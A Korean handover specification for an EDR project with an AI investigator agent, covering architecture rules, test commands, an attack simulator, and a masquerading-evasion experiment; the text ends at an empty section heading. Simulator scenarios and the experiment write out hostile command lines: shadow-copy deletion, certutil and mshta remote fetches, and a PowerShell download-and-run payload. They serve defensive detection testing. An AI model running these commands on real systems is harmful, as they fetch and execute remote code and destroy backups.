---
description: >-
  Phalanx EDR Phase 1~4.1 구현 완료 현황, 복합 회피 실험 한계점, FileInspectionTool 상세 규격,
  모의 침해 시뮬레이터(AttackSimulator) 운용 체계, 현재 시스템의 목(Mock)/스텁 인벤토리 현황, 후속 필수 실험 과제 및 개발 에이전트를 위한 핵심 기술 인수인계 사양서.
related:
  - ../README.md
  - ./01_system_architecture.md
  - ./02_ai_agent_investigation_design.md
  - ./03_implementation_roadmap.md
  - ./04_performance_benchmarks.md
  - ../../troubleshooting/phalanx.md
---
# Phalanx EDR Agent Handover Specification (Phase 1 ~ 4.1)

## 1. 프로젝트 현황 및 리포지토리 매핑

* **메인 리포지토리**: `../Phalanx`
  * 활성 작업 브랜치: `feature/phase3-ai-hunter`
  * 원격 저장소: `https://github.com/jin20203458/phalanx` (최신 커밋 푸시 완료)
* **지식베이스 리포지토리**: `../Obsidian.Agent`
  * 공식 스펙: `Phalanx/docs/`
  * 트러블슈팅 런북: `troubleshooting/phalanx.md` (12개 핵심 기술 문제 해결 내역 보존)
* **솔루션 파일**: `Phalanx.sln` (Visual Studio 2026 / Dev18 및 VS 2022 v17.x 호환 표준 솔루션)

---

## 2. 핵심 아키텍처 불변식 및 코드베이스 매핑 (Architectural Invariants & Code Mapping)

최상위 상시 행동 수칙인 [`.agents/AGENTS.md`](../../../Phalanx/.agents/AGENTS.md)의 핵심 규칙들을 실제 코드베이스에서 안전하게 계승하기 위해, 후속 에이전트는 아래 5대 불변식의 구현 메커니즘과 세부 매핑 위치를 준수해야 합니다:

1. **AI 수사관 단일 진실 공급원 (SSOT Decision Authority)**:
   * ReAct 루프가 정상 종결(`reachedFinal == true && hasValidAction`)된 경우, Gemini 모델의 `VerdictAction`(`ACTION_KILL` vs `ACTION_RESUME`)은 절대적 최상위 결정권을 가집니다.
   * `CommandLine.Contains("-enc")` 등 단순 정적 문자열 검사로 LLM의 정상 판결을 사살로 강제 오버라이드하거나 사내 IP를 임의 차단하는 하드코딩 if문을 절대 추가하지 마십시오.
   * 시스템 가드는 **최대 턴(5턴) 초과 타임아웃** 또는 **API 완전 단절/예외** 시의 Fail-Secure 방어에만 국한되어야 합니다.
2. **세이프티 워치독 SLA 계약 (10초 기본 / 50초 연장 티켓)**:
   * C++ 센서는 프로세스를 동결할 때 데드락 및 고아 동결(Orphan Freeze) 방지를 위해 기본 10초(10,000ms) 안전 타임아웃을 적용합니다 ([`SafetyWatchdog::SafetyWatchdog`](../../../Phalanx/src/Phalanx.Sensor/Actuator/SafetyWatchdog.h)).
   * 오프라인 로컬 규칙 엔진(평균 23ms 완결)은 연장을 요청하지 않으므로, 비정상 크래시 시 10초 데드락 자가 회복(Auto-Resume)이 보장됩니다.
   * C# AI 헌터가 외부 LLM 심층 수사에 진입할 경우 즉시 `ACTION_EXTEND_TIMEOUT` 티켓을 선제 발송하여 마감 기한을 1회에 한해 50초 누적 연장(+50,000ms ➔ 총 60초 예산 확보)합니다 ([`SafetyWatchdog::ExtendTimeout`](../../../Phalanx/src/Phalanx.Sensor/Actuator/SafetyWatchdog.h), [`AutonomousHunterAgent.InvestigateWithGeminiAsync`](../../../Phalanx/src/Phalanx.Cockpit/Agent/AutonomousHunterAgent.cs)).
   * C# 최상위 타임아웃 CTS는 네트워크 통신 레이스를 차단하고 워치독 만료 10초 전 안전 마진을 두기 위해 50초(50,000ms)로 엄격 제한합니다 ([`AutonomousHunterAgent`](../../../Phalanx/src/Phalanx.Cockpit/Agent/AutonomousHunterAgent.cs) 취소 토큰, [`troubleshooting/phalanx.md`](../../troubleshooting/phalanx.md)).
3. **UI 스레드 안전 마샬링 및 Headless 호환성**:
   * Kestrel gRPC 및 비동기 작업 스레드는 `ObservableCollection`을 직접 조작할 수 없습니다. 반드시 `CockpitUiBridge.Instance`를 거쳐 `Dispatcher.InvokeAsync`로 마샬링하십시오.
   * 비GUI 환경(단위 테스트 및 `--headless` CI 러너)을 위해 `Application.Current`가 null이어도 예외 없이 안전 통과하는 Null-Safety 방어를 유지해야 합니다.
4. **무결성 레벨 분리 및 수명주기 정리 (Orderly Teardown)**:
   * 관리자 권한(`High Integrity`)으로 기동된 C++ 센서는 일반 권한(`Medium Integrity`)의 C#에서 OS 레벨 강제 종료가 거부될 수 있습니다.
   * 종료 시에는 반드시 (1) gRPC `PHALANX_SENSOR_SHUTDOWN` 역전송, (2) Win32 `Local\PhalanxSensorShutdownEvent` 시그널링, (3) `sensorProcess.WaitForExit(3000)` 순서를 유지한 후 Kestrel gRPC 서버를 폐쇄하십시오.
5. **모던 상용 EDR 룩앤필 (0 Emojis Policy)**:
   * 관제 GUI 화면(XAML) 및 뷰모델에 유니코드 이모티콘을 일절 사용하지 마십시오. 순수 XAML 벡터 지오메트리(`IconShield`, `IconTerminal`, `IconKill` 등)와 Obsidian 다크 팔레트 토큰만을 사용합니다.

---

## 3. 컴포넌트 맵 및 핵심 파일 색인

```
Phalanx Root
├── proto/phalanx.proto                      # gRPC 양방향 스트리밍 프로토콜 (TelemetryBatch ↔ MitigationCommand)
├── src/
│   ├── Phalanx.Sensor/ (C++20 Native)       # 커널 텔레메트리 센서 & 고속 액추에이터
│   │   ├── main.cpp                         # 센서 진입점, SeDebugPrivilege, Local 명명 이벤트 감시
│   │   ├── Collector/EtwKernelCollector.cpp # Windows 커널 ETW 후킹 수집기
│   │   ├── Actuator/ProcessActuator.cpp     # 24μs NtSuspendProcess 동결 및 0.1ms TerminateProcess 사살
│   │   ├── Actuator/SafetyWatchdog.cpp      # 데드라인 기반 동결 해제 워치독
│   │   ├── Rules/LocalRuleEngine.cpp        # 100μs 오프라인 로컬 규칙 엔진 (PDF/HWP/Office 자식 프로세스)
│   │   └── Ipc/GrpcStreamClient.cpp         # asio-grpc C++20 코루틴 클라이언트 (종료 명령 바이패스 포함)
│   └── Phalanx.Cockpit/ (C# .NET 9/10 WPF)  # 엔터프라이즈 관제 허브 & 자율 AI 헌터
│       ├── Program.cs                       # STA 진입점, 백그라운드 Kestrel gRPC, 순차 동기 정리, --headless 지원
│       ├── App.xaml / App.xaml.cs           # WPF App 정의 및 테마 머지
│       ├── Themes/EnterpriseTheme.xaml      # Obsidian 다크 토큰, 벡터 지오메트리, 버튼/카드 스타일
│       ├── Views/                           # 엔터프라이즈 4-View 모듈식 관제 뷰
│       │   ├── MainWindow.xaml              # 최상위 셸 컨테이너 및 센서 상태 바
│       │   ├── IncidentsView.xaml           # 탐지/동결 침해사고 목록 및 실시간 집계 바
│       │   ├── ProcessGraphView.xaml        # FlatNodeList 기반 프로세스 족보 탐색기 및 인스펙터
│       │   ├── InvestigationView.xaml       # Gemini ReAct 3-Panel 자율 수사 스튜디오
│       │   └── AttackLabWindow.xaml         # 7대 침해 시나리오 모의 주입 및 텔레메트리 랩
│       ├── ViewModels/MainViewModel.cs      # 카운터, 필터/검색, 토글 커맨드, 사건 뷰모델 관리
│       ├── Services/CockpitUiBridge.cs      # UI 스레드 디스패처 마샬링 싱글톤 브리지
│       ├── Services/SensorProcessController.cs # 바이너리 탐색, UAC runas 기동, Win32 로컬 이벤트 종료
│       ├── Agent/AutonomousHunterAgent.cs   # Gemini 3.7 Flash 자율 ReAct 수사관 & 다차원 FSM 엔진
│       ├── Agent/Gemini/GeminiRestClient.cs # Vertex AI OAuth2 / Gemini API JSON Mode REST 통신
│       ├── CQRS/ProcessTreeProjectionManager.cs # 인메모리 프로세스 트리 투영 및 족보 추적
│       ├── Storage/ForensicArchiveManager.cs# LiteDB 기반 침해사고 영속 스토리지
│       └── Tools/ (5대 OS 포렌식 도구)
│           ├── DecodePayloadTool.cs         # Base64, Gzip/Deflate 매직 바이트, Hex 해독
│           ├── ProcessMemoryScanTool.cs     # VirtualQueryEx VAD unbacked 실행 메모리 핀포인트 스캔
│           ├── ThreatReputationTool.cs      # 사설망 마스킹, 공공 DNS 화이트리스트, IoC 평가
│           ├── MitreClassifierTool.cs       # 26종 정규식 MITRE ATT&CK 전술 매핑
│           └── SystemFirewallTool.cs        # 게이트웨이 보호망 기반 Windows 방화벽 C2 차단
├── tools/
│   └── Phalanx.AttackSimulator/             # EDR 침해 시나리오 모의 생성기 및 텔레메트리 주입 도구
│       ├── Program.cs                       # 대화형 CLI 메뉴, 타깃 gRPC 엔드포인트 스트리밍
│       ├── Scenarios/AttackScenarioRegistry.cs # 7대 실무 공격/정상 시나리오 및 페이로드 레지스트리
│       └── Logging/TestAuditLogger.cs       # 시나리오 실행 및 판정 결과 감사 로거
├── scripts/
│   ├── run_attack_simulator.ps1             # 모의 공격 시뮬레이터 원클릭 실행 스크립트 (CLI/배치)
│   ├── run_fullchain_test.ps1               # 5대 풀체인 E2E 통합 검증 스크립트
│   └── build.ps1                            # C++ 커널 센서 및 액추에이터 통합 빌드
└── tests/
    ├── Phalanx.Agent.Tests/                 # C# 27개 단위 테스트 및 Live 풀체인 테스트
    └── FullChainCrossE2ETest/               # C++ ➔ C# Cockpit ➔ C++ 크로스 랭귀지 E2E 테스트 바이너리
```

---

## 4. 운영 가이드라인 및 검증 체계 (Operational Guide & Verification)

### 4.1 LLM 인증 정보 구성 (Clean-Room Credential Architecture)

Phalanx는 타 저장소(예: MundusVivens)에 대한 런타임 의존성 없이 자체 격리(Clean-Room) 환경에서 동작합니다:
1. **환경 변수 우선**: `GOOGLE_APPLICATION_CREDENTIALS` 환경 변수가 지정되어 있을 경우 최우선 로드.
2. **Phalanx 자체 로컬 Config**: 환경 변수 미지정 시 `src/Phalanx.Cockpit/Config/google-credentials.json` 및 `src/Phalanx.Cockpit/AppSettings.json`에서 자체 프로젝트/서비스 계정 정보 탐색.
3. **보안 규칙**: `google-credentials.json` 및 `AppSettings.json`은 `.gitignore`에 등록되어 엄격히 커밋에서 제외됨.

### 4.2 검증 체계 및 특화 테스트 가이드 (Verification Suite & Live Guidelines)

기본적인 상시 빌드 및 테스트 명령어(C# 빌드, 단위 테스트, C++ 빌드, 풀체인 E2E)는 최상위 규격인 [`.agents/AGENTS.md`](../../../Phalanx/.agents/AGENTS.md)의 `<critical_rules>`에 단일 진실(SSOT)로 정의되어 있습니다.

인수인계 시 실제 클라우드 AI 인프라 연동을 포함한 전체 검증 절차는 아래 특화 지침을 따릅니다:

1. **상시 의무 검증 (Mandatory QA - 오프라인)**:
   * `dotnet build Phalanx.sln`: C# 컴파일 오류 및 경고 0개 확인.
   * `dotnet test tests/Phalanx.Agent.Tests/ --filter "Category=Unit"`: 27개 순수 단위 테스트 통과 확인 (~1초).
   * `powershell -ExecutionPolicy Bypass -File .\build.ps1`: C++ 네이티브 센서/엔진 빌드.
   * `powershell -ExecutionPolicy Bypass -File .\scripts\run_fullchain_test.ps1`: 5대 풀체인 E2E 크로스 랭귀지 통합 검증.

2. **클라우드 Vertex AI 실시간 연동 검증 (Live AI Benchmark)**:
   * 실행 명령어: `dotnet test tests/Phalanx.Agent.Tests/ --filter "Category=Live"`
   * **실행 전제 조건**: `GOOGLE_APPLICATION_CREDENTIALS` 환경 변수 또는 `src/Phalanx.Cockpit/Config/google-credentials.json`이 유효해야 합니다.
   * **실측 검증 대상**: 실제 Gemini 3.7 Flash 모델에 10대 실무 프로세스(악성 6종 + 정상 4종) 침해 수사를 실시간 요청하여 턴 수(평균 2.40턴), 레이턴시, `ACTION_KILL`/`ACTION_RESUME` 판정 무결성을 현장 실사합니다.

### 4.3 모의 침해 공격 시뮬레이터 운용 및 시나리오 검증 체계 (AttackSimulator Guide)

실제 엔드포인트 침해 사고 및 커널 동결/사살, AI ReAct 수사 파이프라인을 실시간 관제 화면(`Phalanx.Cockpit`)과 연동하여 재현 및 시연할 수 있도록 전용 모의 공격 도구(`Phalanx.AttackSimulator`)와 실행 스크립트가 제공됩니다.

#### A. 실행 명령어 및 구동 모드
* **실행 스크립트**: [`scripts/run_attack_simulator.ps1`](../../../Phalanx/scripts/run_attack_simulator.ps1)
* **대화형 CLI 메뉴 모드**:
  ```powershell
  powershell -ExecutionPolicy Bypass -File .\scripts\run_attack_simulator.ps1
  ```
  콘솔에서 대화형 번호 선택 인터페이스를 통해 원하는 시나리오를 선택하여 발송합니다.
* **단일 시나리오 직결 실행**:
  ```powershell
  # 시나리오 1번(Office C2 드롭퍼) 즉시 실행
  powershell -ExecutionPolicy Bypass -File .\scripts\run_attack_simulator.ps1 -Scenario 1

  # 비대화형 자동화 러너 (CI/배치용)
  powershell -ExecutionPolicy Bypass -File .\scripts\run_attack_simulator.ps1 -Scenario 1 -NonInteractive
  ```
* **전체 시나리오 순차 일괄 검증**:
  ```powershell
  # 1~7번 전 시나리오를 4초 간격으로 자동 순차 주입
  powershell -ExecutionPolicy Bypass -File .\scripts\run_attack_simulator.ps1 -Scenario 8
  ```

#### B. 7대 실무 시나리오 레지스트리 규격 ([`AttackScenarioRegistry.cs`](../../../Phalanx/tools/Phalanx.AttackSimulator/Scenarios/AttackScenarioRegistry.cs))

| ID | 시나리오 명칭 | 시뮬레이션 페이로드 및 동작 | 기대 처분 (`ExpectedAction`) | 대응 파이프라인 |
|---|---|---|---|---|
| **1** | Office LOLBAS C2 Dropper | `winword.exe` ➔ `powershell.exe -enc <C2 다운로더>` | `ACTION_KILL` | 24μs 선제 동결 ➔ ReAct 3턴 사살 (확신도 99% 실측) |
| **2** | Ransomware Shadow Copy Deletion | `vssadmin.exe delete shadows /all /quiet` | `ACTION_KILL` | C++ 커널 룰 엔진 0.08ms 즉각 현장 사살 (Reflex Kill) |
| **3** | LOLBAS CertUtil Remote Payload | `excel.exe` ➔ `certutil.exe -urlcache -split -f http://...` | `ACTION_KILL` | 24μs 동결 ➔ 위협 평판 조회 ➔ 사살 및 IoC 등록 |
| **4** | Browser Drive-by HTA Attack | `msedge.exe` ➔ `mshta.exe http://185.220.101.5/invoice.hta` | `ACTION_KILL` | 24μs 동결 ➔ MITRE ATT&CK T1218.005 분류 ➔ 사살 |
| **5** | Masquerading Dropper (T1036.005) | `explorer.exe` ➔ `powershell.exe -enc` ➔ `Temp\svchost.exe` | `ACTION_KILL` | 5턴 심층 수사 ➔ 사살 및 Windows 방화벽 C2 차단 |
| **6** | Benign Admin Script (Known-Good) | `explorer.exe` ➔ `powershell.exe -enc <Get-Service>` | `ACTION_RESUME` | 정상 관리 스크립트 오탐 방지 가드 ➔ 원자적 동결 해제 |
| **7** | Process Tree DAG Burst | 50개 프로세스 생성/종료 델타 이벤트 연속 주입 | `ACTION_RESUME` | 고부하 인메모리 프로세스 트리 및 관제 콕핏 60FPS 스트레스 검증 |

#### C. 주입 아키텍처 및 3-모드 주입 체계 (Injection Modes)
1. **클린룸 인프로세스 모드 (`CleanRoom`, 기본값)**:
   * 실제 OS 프로세스를 띄우지 않고, CQRS `ProcessTreeProjectionManager`로 규격화된 `TelemetryBatch`를 인프로세스에서 직접 주입.
   * 초고속으로 EDR 탐지 파이프라인 및 ReAct AI 헌터의 추론/의사결정을 무해하고 안전하게 검증 가능.
2. **하이브리드 OS 프로세스 스폰 모드 (`OsHybrid`)**:
   * 실제 Windows OS 상에서 무해한 안전 프로세스(`cmd.exe /c timeout`, `powershell Start-Sleep`)를 일시 생성하여 실제 PID 및 Win32 핸들 연동을 병행 검증.
3. **전문가 라이브 모드 (`LiveExpert`)**:
   * 실제 공격 시그니처와 페이로드를 OS 상에 직접 기동하여 디스크/메모리 상에서 실체화.
   * **Safe Weaponization**: 랜섬웨어 파괴 명령(`vssadmin delete shadows`)을 안전 조회(`vssadmin list shadows`)로 대체하여 호스트 파괴 원천 차단.
   * **Phase 5 위장 드로퍼 실체화**: `C:\Windows\Temp\svchost.exe` 더미 페이로드를 물리 생성하여 `FileInspectionTool` 부재로 인한 턴 지연을 실측.
   * **Teardown Guarantee**: `try-finally`에서 미종료 고아 프로세스 및 드롭된 임시 파일을 100% 자동 삭제.

---

## 5. 복합 회피 공격(Masquerading) 실험 결과 및 실측 한계점 분석

### 5.1 실험 개요 및 환경
* **배경**: 10대 실무 시나리오(악성 6종 + 정상 4종) 벤치마크에서는 평균 2.40턴, 12.64초 만에 100% 정확도로 판결이 종결되었습니다. 그러나 이는 알려진 위협 IoC(블랙리스트 IP, 악성 파라미터)가 비교적 명확한 시나리오였습니다.
* **실험 설계**: 블랙리스트에 등재되지 않은 미등록 외부 IP와 시스템 핵심 파일명 위장 기법이 결합된 **복합 회피 공격(T1036.005 Masquerading)**을 모의하여 AI 수사관의 심층 추론 및 도구 연동 한계를 실측하였습니다.
* **공격 벡터**:
  * 부모 프로세스: `explorer.exe` (정상 셸 컨텍스트)
  * 실행 명령: `powershell.exe -w hidden -enc <Base64>`
  * 해독 페이로드: `(New-Object Net.WebClient).DownloadFile('http://198.51.100.99/update.dat', 'C:\Windows\Temp\svchost.exe'); Start-Process 'C:\Windows\Temp\svchost.exe'`
  * 회피 요소:
    1. 외부 IP `198.51.100.99`는 신규 도메인/미등록 IP로, 평판 조회 시 사살 기준 미달(점수 30점, `INCONCLUSIVE_EXTERNAL_IP`) 처리.
    2. 생성 타깃이 윈도우 시스템 핵심 바이너리(`svchost.exe`)이나, 실제 저장 위치는 임시 디렉터리(`C:\Windows\Temp\`)로 위장.

### 5.2 실험 관측 결과 (Ground Truth)
* **총 소요 턴 수**: **5 턴** (최대 예산 5턴 완전 전소)
* **종단간 소요 시간**: **36.5 초** (36,489 ms)
* **최종 판결**: `ACTION_KILL` (확신도 96%, 방화벽 차단 완료)
* **턴별 동작 추적**:
  1. `Turn 1 (6.87초)`: `DecodePayloadTool` 호출 ➔ Base64 인라인 페이로드 해독 성공 (`update.dat` 다운로드 및 `C:\Windows\Temp\svchost.exe` 생성 확인).
  2. `Turn 2 (2.60초)`: `ThreatReputationTool` 호출 ➔ IP `198.51.100.99` 조회. 점수 30점 반환과 함께 *"단독 지표로 사살하지 말고 복합 증거를 수집하라"*는 가드레일 피드백 수신.
  3. `Turn 3 (21.70초)`: `ProcessMemoryScanTool` 호출 ➔ IP 단독 사살이 차단되자, 모델이 추가 증거 수집을 위해 프로세스 메모리 스캔을 fallback으로 시도.
  4. `Turn 4 (5.22초)`: 도구 호출 없음 (사고 종결) ➔ 숨김 옵션(`-w hidden`) + Base64 은닉 + 미등록 외부 IP + Temp 내 svchost.exe 위장(T1036.005) 증거를 종합하여 사살 확정.
  5. `Turn 5 (0.00초)`: `SystemFirewallTool` 호출 ➔ 식별된 C2 IP `198.51.100.99`를 Windows 방화벽에 즉시 차단 규칙 등록.

### 5.3 식별된 핵심 아키텍처적 한계점 (Limitations)

1. **디스크 포렌식 도구 결핍 (Tool Gap)**:
   * 공격 페이로드가 디스크에 생성하려는 타깃 파일(`C:\Windows\Temp\svchost.exe`)의 무결성, 디지털 서명(Authenticode), 시스템 정규 경로 위반 여부를 직접 검증할 수 있는 도구가 전무했습니다.
2. **비효율적 우회 호출로 인한 레이턴시 병목**:
   * 파일 검증 도구가 없자, 모델이 차선책으로 `ProcessMemoryScanTool`을 호출하였습니다.
   * 이로 인해 메모리 VAD 스캔 및 LLM 왕복에 **21.7초가 낭비**되었으며, 이는 세이프티 워치독 SLA(연장 포함 50초 마진)의 43.4%를 잠식하는 위험 요인으로 작용했습니다.
3. **평판 점수 가드레일과의 상호작용 지연**:
   * `ThreatReputationTool`이 30점(`INCONCLUSIVE`)을 반환하며 단독 사살을 차단하는 가드레일은 오탐 방지에 필수적이나, 이를 보완할 로컬 포렌식 증거 도구가 부족할 경우 에이전트가 턴을 낭비하게 만듭니다.
4. **턴 예산 임계치 도달 위험 (Budget Exhaustion Risk)**:
   * 5턴 한도 내에서 가까스로 최종 판결에 도달하였으나, 난독화가 2중으로 적용되었거나 레지스트리 영속화(Run Key) 등이 결합된 실전 고도화 APT 공격에서는 5턴을 초과하여 타임아웃 강제 Fail-Secure 사살(증적 불완전)로 종결될 위험이 실증되었습니다.

---

## 6. 실무 악성코드 탐지 고도화를 위한 신규 도구 규격 (`FileInspectionTool`)

위 한계점을 근본적으로 해결하기 위해, 디스크 파일 메타데이터, 디지털 서명, 시스템 경로 위장을 0.05초 이내에 확증할 수 있는 `FileInspectionTool`을 신설해야 합니다.

### 6.1 도구 설계 목적 및 책임 (Responsibility)
* 디스크 파일의 존재 유무 확인 및 정적 메타데이터(크기, 시간, 해시) 수집.
* Win32 `WinVerifyTrust` 기반 Microsoft 정식 디지털 서명(Authenticode) 체인 검증.
* 윈도우 시스템 핵심 실행 파일(System32)의 비인가 디렉터리(Temp, AppData 등) 위장 배치(Masquerading) 적발.
* PE 헤더 매직 바이트 검사 및 확장자 위장(Executable disguised as .dat/.jpg) 즉각 감별.

### 6.2 핵심 기능 및 기술 구현 사양

#### A. 디지털 서명 검증 (Authenticode Verification)
* **구현 방식**: `wintrust.dll` 및 `crypt32.dll`의 `WinVerifyTrust` API P/Invoke 호출.
* **검증 액션 GUID**: `WINTRUST_ACTION_GENERIC_VERIFY_V2` (`{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}`).
* **주요 플래그**:
  * `WTD_REVOCATION_CHECK_NONE` (오프라인/동결 상태 고속 검증용) 또는 `WTD_REVOCATION_CHECK_CHAIN`
  * `WTD_STATEACTION_VERIFY`
* **추출 정보**: 서명 유효 여부(`IsValid`), 서명 주체(`SignerSubjectName`), 발급자(`IssuerName`), 카탈로그 서명 여부(`IsCatalogSigned`).
* **판정 기준**: Microsoft Windows 정규 서명이 없거나 유효하지 않은 `svchost.exe`, `csrss.exe`, `lsass.exe` 등은 즉시 위험 점수 100점 부여.

#### B. 시스템 파일 경로 위장 탐지 (Path Anomaly Detection)
* **보호 대상 시스템 프로세스 화이트리스트 맵**:
  * `svchost.exe`, `csrss.exe`, `smss.exe`, `wininit.exe`, `winlogon.exe`, `services.exe`, `lsass.exe` ➔ 정규 경로: `C:\Windows\System32\`
  * `explorer.exe` ➔ 정규 경로: `C:\Windows\`
* **탐지 로직**:
  * 파일명이 시스템 화이트리스트에 포함되는데, 실제 경로가 `\Temp\`, `\AppData\`, `\Users\Public\`, `\PerfLogs\` 등에 위치할 경우 `IsPathMasqueraded = true` 판정.

#### C. 파일 엔트로피 및 확장자 위장 분석
* **Shannon Entropy 연산**:
  * 파일 바이트 스트림(최대 1MB 샘플링) 대상 섀넌 엔트로피 계산.
  * $H(X) = -\sum_{i=1}^{n} P(x_i) \log_2 P(x_i)$
  * 엔트로피 $> 7.2$ 인 경우 고밀도 암호화/패킹(UPX, Themida 등) 페이로드로 분류.
* **매직 바이트 감별**:
  * 파일 확장자가 `.dat`, `.txt`, `.jpg`, `.log` 등 비실행형 확장자이나, 첫 2바이트가 `MZ` (`0x4D, 0x5A`)이고 PE 헤더(`PE\0\0`)가 존재하는 경우 `IsDisguisedExecutable = true` 판정.

### 6.3 입출력 데이터 규격 (Interface Specification)

```csharp
namespace Phalanx.Cockpit.Tools;

public sealed class FileInspectionTool : IInvestigationTool
{
    public string Name => "FileInspectionTool";
    public string Description => 
        "디스크 상의 파일 경로, 디지털 서명(Authenticode), 시스템 파일 위장(Masquerading), " +
        "PE 헤더 정합성, 엔트로피를 정밀 검증합니다. 인자: { \"filePath\": \"C:\\\\...\" }";

    public async Task<ToolResult> ExecuteAsync(Dictionary<string, object> parameters)
    {
        // WinVerifyTrust P/Invoke, 시스템 경로 위장 검증, 섀넌 엔트로피 분석 수행
        // 반환: new ToolResult(true, observationSummary, resultData)
    }

    // 도구 입력 인자 모델
    public sealed class Input
    {
        [JsonPropertyName("filePath")]
        public string FilePath { get; set; } = string.Empty;
    }

    // 도구 관측 결과 모델
    public sealed class Output
    {
        public bool Exists { get; set; }
        public string NormalizedPath { get; set; } = string.Empty;
        public long FileSizeBytes { get; set; }
        public string Sha256 { get; set; } = string.Empty;
        public double Entropy { get; set; }
        public bool IsSigned { get; set; }
        public string SignerSubject { get; set; } = string.Empty;
        public string SignatureStatus { get; set; } = string.Empty; // e.g. "VALID_MICROSOFT", "INVALID_OR_UNSIGNED"
        public bool IsPathMasqueraded { get; set; }
        public bool IsDisguisedExecutable { get; set; }
        public int AnomalyScore { get; set; } // 0 ~ 100
        public string DiagnosticReason { get; set; } = string.Empty;
    }
}
```

### 6.4 의존성 주입(DI) 등록 및 `AutonomousHunterAgent` 프롬프트 통합
* **DI 컨테이너 등록**: `Program.cs`에서 `builder.Services.AddSingleton<IInvestigationTool, FileInspectionTool>();` 등록 (Cockpit 기동 시 `IEnumerable<IInvestigationTool>` 컬렉션을 통해 `AutonomousHunterAgent`에 자동 주입).
* **PICCO 시스템 프롬프트 업데이트**:
  * `[AVAILABLE FORENSIC TOOLS]` 섹션에 `FileInspectionTool` 인터페이스 및 입출력 명세 추가.
  * **수사 지침 규칙(Rules)**:
    *"페이로드 해독이나 명령행에서 다운로드/생성되는 로컬 파일 경로가 포착되면, 메모리 스캔보다 먼저 FileInspectionTool을 호출하여 디지털 서명 및 시스템 경로 위장(Masquerading) 여부를 우선 확증하십시오."*

---

## 7. 후속 개발 에이전트를 위한 향후 필수 실험 및 벤치마크 과제 (Future Empirical Research)

차기 에이전트는 아래 5대 실험 과제를 순차적으로 진행하여 실측 데이터(Ground Truth)를 확보해야 합니다:

### 과제 1: `FileInspectionTool` 주입 후 복합 회피 공격 수사 압축률 검증
* **실험 목적**: `FileInspectionTool` 신설 후, 동일한 복합 회피 공격(T1036.005) 시나리오에서 턴 수 및 레이턴시의 단축 효과를 실측.
* **가설**:
  * 기존: Turn 1(해독) ➔ Turn 2(IP 평판 30점 미달) ➔ Turn 3(메모리 스캔 21.7초) ➔ Turn 4(종결) = 총 5턴, 36.5초.
  * 개선: Turn 1(해독) ➔ Turn 2(`FileInspectionTool`로 Temp 내 svchost 무서명/위장 확증, 0.05초) ➔ Turn 3(최종 사살 집행) = **총 2~3턴, 10초 내외 종결 (72% 단축)**.
* **검증 방법**:
  * `AutonomousHunterAgentTests`에 `TestLive_ConvolutedEvasiveMasquerading_WithFileInspection` 테스트 신설.
  * 소요 턴 수, 턴별 도구 호출 시퀀스, 총 레이턴시 집계 후 `04_performance_benchmarks.md`에 등재.

### 과제 2: LOLBAS 듀얼 위장 및 Living-off-the-Land 바이너리 심층 분별 실험
* **실험 목적**: 정상 서명된 유효 바이너리(`certutil.exe`, `mshta.exe`, `powershell.exe`)가 악성 인자를 동반할 때와, 파일 자체가 가짜 바이너리로 교체/위장된 경우의 이중 분별력 검증.
* **테스트 케이스**:
  1. 정품 `certutil.exe` (Microsoft 서명 유효) + 악성 URL 인자 ➔ `DecodePayloadTool` + `ThreatReputationTool` 중심 사살.
  2. 악성 트로이목마 `certutil.exe` (임시 폴더 배치, 서명 무효) ➔ `FileInspectionTool` 단독 1턴 즉각 사살.

### 과제 3: YARA 룰셋 연계 인메모리 핀포인트 스캔 연동 실험
* **실험 목적**: `ProcessMemoryScanTool`의 단순 VAD 실행 속성(`PAGE_EXECUTE_READWRITE`) 검사를 넘어, 인메모리 바이트 패턴에 사전 컴파일된 YARA 룰셋(Cobalt Strike Beacon, Meterpreter, Mimikatz)을 매칭하는 성능 실측.
* **성능 목표**: 4KB~64KB 커밋 메모리 블록 대상 매칭 지연시간 1.0ms 이하 유지.

### 과제 4: 다중 프로세스(Multi-Process Tree) 상속 체인 추적 및 동시 동결/수사 확장성 실험
* **실험 목적**: 오피스 매크로(`winword.exe`)가 자식 CMD(`cmd.exe`), 손자 파워셸(`powershell.exe`), 증손자 호스트(`conhost.exe`)를 연속 분기하는 트리형 공격에서, C++ 센서의 동시 다중 동결(`NtSuspendProcess` x N) 및 C# AI 헌터의 상속 체인 일괄 처분 검증.
* **검증 항목**: 프로세스 트리 투영 매니저(`ProcessTreeProjectionManager`)의 인메모리 DAG 상에서 부모-자식 관계의 고아(Ghost/Tombstone) 누수 여부 전수 감사.

### 과제 5: 고부하(Burst Telemetry) 상황에서의 Kestrel gRPC 스트리밍 큐 및 I/O 병목 실측
* **실험 목적**: 초당 10,000건 이상의 프로세스 생성/종료 이벤트 폭주 시, C++ `asio-grpc` 클라이언트와 C# Kestrel gRPC 서버 간의 더블 버퍼링 링버퍼 오버플로 및 LiteDB 스토리지 I/O 병목 측정.
* **평가 지표**: 이벤트 드롭률(0.00% 달성 여부), C# GC Gen2 컬렉션 빈도, 메모리 풋프린트 상한선(< 150MB).

---

## 8. 차기 백로그 및 구현 권장 사항 (Next Backlog)

1. **`FileInspectionTool.cs` 구현 및 단위 테스트 작성**:
   * `src/Phalanx.Cockpit/Tools/FileInspectionTool.cs` 신설.
   * `WinVerifyTrust` P/Invoke 구조체 정의 및 단위 테스트(`tests/Phalanx.Agent.Tests/Tools/FileInspectionToolTests.cs`)를 통한 모의 파일 서명/경로 위장 검증.
2. **QuestPDF 기반 포렌식 감사 리포트 (A4 PDF Export)**:
   * 관제 화면에서 사건 카드 선택 시, LiteDB의 수사 기록(`ForensicIncidentRecord`)과 ReAct 추론 트레이스를 바탕으로 공공/금융 보안 표준 양식의 1장 요약 A4 PDF 문서 생성 기능 구현.
3. **MITRE ATT&CK 내비게이터 매트릭스 시각화 뷰**:
   * 우측 포렌식 인스펙터에 12대 공격 전술 매트릭스를 미니 맵 형태로 시각화하여 현재 탐지된 공격 단계(Tactic)를 하이라이트 표시.

---

## 9. 현재 시스템의 목(Mock) / 스텁(Stub) / 미연동 인벤토리 현황 (Mock & Stub Inventory)

Phase 4 및 Phase 4.1 UI 전면 개편(4-View 모듈식 아키텍처)이 완료됨에 따라, UI 바인딩 및 뷰모델 연결 작업은 완결되었습니다. 본 절은 **이미 조치 완료된 UI 항목**과 향후 백엔드 파이프라인에서 **순차적으로 실체화(Un-mock)해야 하는 잔여 항목**의 전수 감사 인벤토리입니다.

### 9.1 목/스텁 항목 총괄 요약표

#### A. 조치 완료 항목 (Phase 4 / 4.1 / 5.2 완료)

